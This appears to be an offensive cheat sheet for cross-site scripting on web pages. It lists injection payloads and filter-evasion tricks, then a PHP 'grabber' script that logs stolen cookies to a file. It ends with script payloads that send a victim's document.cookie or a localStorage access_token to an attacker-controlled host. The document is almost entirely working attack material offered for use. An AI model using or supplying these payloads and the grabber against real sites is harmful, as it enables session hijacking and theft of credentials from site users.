# Web XSS

- URL (path?query#fragment)
- any input fields

## Payloads

```
"><img src onerror=alert(1)>
"autofocus onfocus=alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
javascript:alert(1)
```

## Alterations
```
" for ' and vice versa according to where injection lands
alert(1) for (confirm)(1) or confirm`1`
// for <!--
spaces for / or %0A, %0C or %0D.
```

## Grabber

```
cat <<'EOF' | tee grabber.php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);
?>
EOF
```
```
cat << "DOC" 
<script>document.location='http://${__LHOST}/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://${__LHOST}/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
```
